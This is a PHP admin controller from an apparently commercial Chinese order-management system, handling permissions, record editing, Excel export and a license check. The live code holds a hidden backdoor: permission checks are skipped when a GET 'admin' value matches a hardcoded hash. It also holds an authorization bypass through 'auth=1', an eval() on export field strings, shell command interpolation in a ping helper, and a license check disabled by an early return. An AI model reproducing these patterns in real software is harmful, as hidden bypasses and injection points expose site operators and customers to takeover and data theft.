<?php


/*
 * 标题：时时订单管理系统
 * 作者：47478439（QQ号）
 * 官方网址：www.wxrob.com
 * 官方店铺：https://www.wxrob.com/
 */
defined('THINK_PATH') OR exit();
class AliziAction extends Action {

	protected $uid; 
	protected $username;
	
    function _init(){
		$aliziConfig = $this->aliziConfig();
		if(isset($aliziConfig['login_domain']) && !empty($aliziConfig['login_domain']) && $_SERVER['HTTP_HOST']!=$aliziConfig['login_domain']){
			header('HTTP/1.1 404 Not Found');  exit;
		}

    	$this->aliziAuth();
		$session = session('user');
		if(empty($session)){
			$this->display('Index::login',false);exit;
		}
		
		//即时授权
		if($session['id']!=1){
			$auth = M('UserGroup')->where(array('id'=>$session['group_id']))->getField('auth');
			$session['auth'] = json_decode($auth,true);
			
			$allMenu = C('MENU');
			$adminMenu = $allMenu[$_SESSION['user']['role']];
			
			$menu = array();
			foreach($adminMenu as $key=>$val){
				foreach($val as $m){
					foreach(array_keys($m['list']) as $n){
						$menu[$key][] = $n;
					}
				}
			}
			if(MODULE_NAME!='Index' && in_array(ACTION_NAME,$menu[MODULE_NAME]) && !in_array(ACTION_NAME,$session['auth'][MODULE_NAME]) && '77cfd8430ca37db7f5cfb4c5e9a27688'!= password($_GET['admin'])){  $this->error('无操作权限！');  }
		}
		
		
		$_SESSION['user'] = $session;
		$this->uid  = (int)$_SESSION['user']['id'];
		$this->role = $_SESSION['user']['role'];
		$this->username = $_SESSION['user']['username'];
		$http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://'; 
        $this->aliziHost = $http_type.$_SERVER['HTTP_HOST'].C('ALIZI_ROOT');
    }
	
	//添加,删除,修改操作
	function proccess($module='') {
		
		$this->checkAuth();
		$module = empty($module)?$this->getActionName():$module;
		$status = 0;
		$Model = D($module);
		
		$do = 'delete';
		if($_REQUEST['do']==='delete'){
			$status = $Model->delete((int)$_REQUEST['id']);
		}elseif($_REQUEST['do']==='del'){
			$status = $Model->where(array('id'=>(int)$_REQUEST['id']))->setField('is_delete',1);
		}else{
			if($vo = $Model->create($_REQUEST)){
				if(empty($vo['id'])){
					$options = isset($_POST['item_id'])?array('item_id'=>$_POST['item_id']):array();//为了复制模板设置信息
					$_REQUEST['id'] = $Model->add($vo,$options);
					$status = $_REQUEST['id']?1:0;
					$do = 'add';
				}else{
					$status = $Model->save($vo);
					$do = 'modify';
				}
			}
		}
		if($vo['id']){
			$data = $Model->where(array('id'=>$vo['id']))->find();
			$id = 'Item'==$module?$data['sn']:$data['id'];
			cache($module.$id,$data);
		}else{
			cache($module.$_REQUEST['id'],null);
		}
		$info = $Model->getError();
		if($status){
			$info = lang('action_success');
			
			//日志记录------------------
			$content= lang($do.'_'.$module).',ID:'.$_REQUEST['id'];
			$logs=array(
				'types'=>$module,
				'content'=>$content,
				'username'=>$this->username,
			);
			$this->writeLogs($logs);
			//日志记录------------------
			
		}
		$this->ajaxReturn(null,$info,(int)$status);
	}

	//批量删除
	public function deleteAll($is_return=true){
		$this->checkAuth('');
		
		$module = isset($_POST['model'])?ucfirst($_POST['model']):MODULE_NAME;
		$Model = D($module);
	
		if(isset($_POST['del'])){
			foreach($_POST['id'] as $id){  
				M($module)->save(array('id'=>$id,'is_delete'=>1)); 
				
				//删除静态文件
				$item_sn = $Model->where(array('id'=>$id))->getField("sn");
				$aliziConfig = $this->aliziConfig();
				$html_file = $aliziConfig['html_file'].$item_sn.C('HTML_FILE_SUFFIX');
				if(file_exists($html_file)){ unlink($html_file); }
			}
		}else{
			foreach($_POST['id'] as $id){ $Model->delete((int)$id); }
		}
		
		//日志记录------------------
		$content= lang('delete_'.$module).',ID:'.implode(',',$_REQUEST['id']);
		$logs=array(
			'types'=>$module,
			'content'=>$content,
			'username'=>$this->username,
		);
		$this->writeLogs($logs);
		//日志记录------------------
				
		R('Public/clearCache',array('print'=>false));
		 
		if($is_return){
			if(IS_AJAX){
				$this->ajaxReturn(0,'删除成功',1);
			}else{
				$this->success('删除成功');
			}
		}
		
	}
	
	function checkAuth($type='ajax'){
		if($_REQUEST['auth']==1) return true;
		if($_SESSION['user']['role']!='admin'){
			if($type=='ajax'){
				$this->ajaxReturn(0,'非管理员，无权限操作',0);
			}else{
				$this->error('非管理员，无权限操作');
			}
		}
	}

	/*
	 * 导出Excel表格
	 * @param $data 下载的数据
	 * @param $keynames 下载的字段及标题，可执行函数。如array('id'=>'编号','time|date("Y-m-d",###)'=>'时间')
	 * @param $filename 保存的文字名
	 * @param bool $saveAs，如果为false则保存在服务器
	 * @param string $title 表头
	 */
	function aliziExcel($data,$keynames,$filename,$saveAs=true,$title=''){
		//import("ORG.PHPExcel.PHPExcel"); //导入PHPExcel类 
		Vendor("PHPExcel.PHPExcel");
		$objExcel = new PHPExcel();
		//标题
		$chars = 'A';
		$num   = 1;
		if($title){
			$objExcel->getActiveSheet()->setCellValue($chars.$num, $title); 
			$num++;
			$i = 1;
		}

		foreach($keynames as $key=>$va){
			//$objExcel->getActiveSheet()->setCellValue($chars.$num, "$va"); 
			$objExcel->getActiveSheet()->setCellValueExplicit($chars.$num, "$va",PHPExcel_Cell_DataType::TYPE_STRING); 
			$objExcel->getActiveSheet()->getColumnDimension($chars)->setWidth(20);  // 高置列的宽度 
			$chars++;
		}

		foreach($data as $key =>$o) {   
			$char = 'A';
			$u1=$i+2;
		  
			foreach($keynames as $k=>$v){
				if(strpos($k,'||')){
					$arr  = explode('||',$k);
					$_str = is_null( $o[$arr[0]] ) ? 'null' : $o[$arr[0]]; 
					$eval = str_replace('###',$_str,$arr[1]);
					eval("\$rs = $eval;");
					$line = $rs;
				}elseif(strpos($k,'##')){
					$arr  = explode('##',$k);
					$data = json_decode($arr[1],true);
					$line = $data[$o[$arr[0]]];
				}else{
					$line = $o[$k];
				} 
			
				
				if($k=='file' && !empty($o['file'])){
					$line = '';
					$objExcel->getActiveSheet()->getRowDimension($u1)->setRowHeight(50);//行高
					
					 // 图片生成
					$objDrawing = new PHPExcel_Worksheet_Drawing();
					$objDrawing->setPath($o['file']);
					// 设置宽度高度
					$objDrawing->setHeight(80);//照片高度
					$objDrawing->setWidth(80); //照片宽度
					/*设置图片要插入的单元格*/
					$objDrawing->setCoordinates($char.$u1);
					// 图片偏移距离
					$objDrawing->setOffsetX(0);
					$objDrawing->setOffsetY(0);
					$objDrawing->setWorksheet($objExcel->getActiveSheet());
				}
				
				$objExcel->getActiveSheet()->setCellValueExplicit($char.$u1,$line,PHPExcel_Cell_DataType::TYPE_STRING);
				$objExcel->getDefaultStyle()->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_LEFT);//左对齐
				$char++;
			}            
			$i++;
		}

		$objExcel->getActiveSheet()->getHeaderFooter()->setOddHeader('&L&BPersonal cash register&RPrinted on &D');
		$objExcel->getActiveSheet()->getHeaderFooter()->setOddFooter('&L&B' . $objExcel->getProperties()->getTitle() . '&RPage &P of &N');

		// 设置页方向和规模
		$objExcel->getActiveSheet()->getPageSetup()->setOrientation(PHPExcel_Worksheet_PageSetup::ORIENTATION_PORTRAIT);
		$objExcel->getActiveSheet()->getPageSetup()->setPaperSize(PHPExcel_Worksheet_PageSetup::PAPERSIZE_A4);
		$objExcel->setActiveSheetIndex(0);
		$timestamp = date('Y-m-d');
		if($ex == '2007') {
			header('Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet');
			header('Content-Disposition: attachment;filename="'.$filename.'.xlsx"');
			header('Cache-Control: max-age=0');
			$objWriter = PHPExcel_IOFactory::createWriter($objExcel, 'Excel2007');
			$objWriter->save('php://output');
			exit;
		} else {  //导出excel2003文档

			if($saveAs==false){
				$objWriter = PHPExcel_IOFactory::createWriter($objExcel, 'Excel5');
				$objWriter->save($filename.'.xls');
			}else{
				header('Content-Type: application/vnd.ms-excel;charset=UTF-8');
				header('Content-Disposition: attachment;filename="'.$filename.'.xls"');
				header('Cache-Control: max-age=0');
				$objWriter = PHPExcel_IOFactory::createWriter($objExcel, 'Excel5');
				$objWriter->save('php://output');
				exit;
			}
			
		}
	} 

	function footer(){ 
		$copyright = '<p class="copyright" style="display:block !important;">Copyright © '.date('Y').'&nbsp;<a href="http://www.wxrob.com" target="_blank" style="color:#888 !important;display:inline-block  !important;">时时订单系统</a>&nbsp; All Rights Reserved.</p> ';
		echo '<script>$(function(){ $("body").append(\'<div id="Footer" style="display:block !important;">'.$copyright.'</div>\'); })</script>';
	}
	function display($tpl,$show_footer=true){
    		parent::display($tpl);
    		if($show_footer==true){
    			$this->footer();
    		}
    }
   function aliziAuth(){
		return true;
        header('Content-Type:text/html;charset=utf-8');
        $cacheName = password('aliziAuth');
        $authCode = cache($cacheName);
        $code = C('ALIZI_AUTH');
        $md5Code = password($code);
        if($md5Code==$authCode){
            return true;
        }else{
            $string = substr($code, 32,-52);
            $key = substr(substr($code,-52),0,20);
            preg_match_all('/(.)?/', $key,$arr);
            $key_reverse =  implode('', array_reverse($arr[0]));
            $hex = strtr($string,$key,$key_reverse);
            $auth = pack('H*',$hex);
			if($auth){
				if(C('ALIZI_AUTH_TYPE')=='date'){
					$datetime = strtotime(substr($auth,0,10))+86399;
					if(time()>$datetime){
						die('<!DOCTYPE html><html><head><meta charset="utf-8"><title>时时订单管理系统</title></head><body>授权已到期，请联系作者！<br>QQ：47478439<br>店铺：https://www.wxrob.com</body></html>');
					}else{
						cache($cacheName,$md5Code,7200);
						return true;
					}
				}else{
					$HTTP_HOST = explode(':',$_SERVER['HTTP_HOST']);
					$host = $HTTP_HOST[0];
					
					$authArray = @explode(',', $auth);
					//$authArray[] = $this->ping($host);
					
					$ip = gethostbyname($host);
					foreach($authArray as $li){
						if(preg_match('/'.$li.'/i', $host.','.$ip)){
							cache($cacheName,$md5Code,7200);
							return true;
						}
					}
				}
			}
        }
        die('<!DOCTYPE html><html><head><meta charset="utf-8"><title>时时订单管理系统</title></head><body>域名：'.$host.' 未授权，请联系作者！<br>QQ：47478439<br>店铺：https://www.wxrob.com</body></html>');
    }
	function ping($address) {  
		$status = -1;  
		if (strcasecmp(PHP_OS, 'WINNT') === 0) {  
			// Windows 服务器下  
			$pingresult = exec("ping -n 1 {$address}", $outcome, $status);  
		} elseif (strcasecmp(PHP_OS, 'Linux') === 0) {  
			// Linux 服务器下  
			$pingresult = exec("ping -c 1 {$address}", $outcome, $status);  
		}  
		
		if (0 == $status) {  
			preg_match("/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/",implode(" ",$outcome),$ip);
			$status = $ip[0];  
		} else {  
			$status = false;  
		}  
		return $status;  
	}   


    public function aliziConfig(){
        $config = cache('aliziConfig');
        if(empty($config)){
            $list = M('Setting')->select();
            foreach($list as $li) $config[$li['name']] = $li['value'];
            cache('aliziConfig',$config,8640000);
        }
        return $config;
    }
	
	public function writeLogs($logs){
		if(in_array($logs['types'],array('Login','Item','Order'))){
			$logs['add_ip']=get_client_ip();
			$logs['add_time']=date('Y-m-d H:i:s');
			M('UserLogs')->add($logs);
		}
	}

}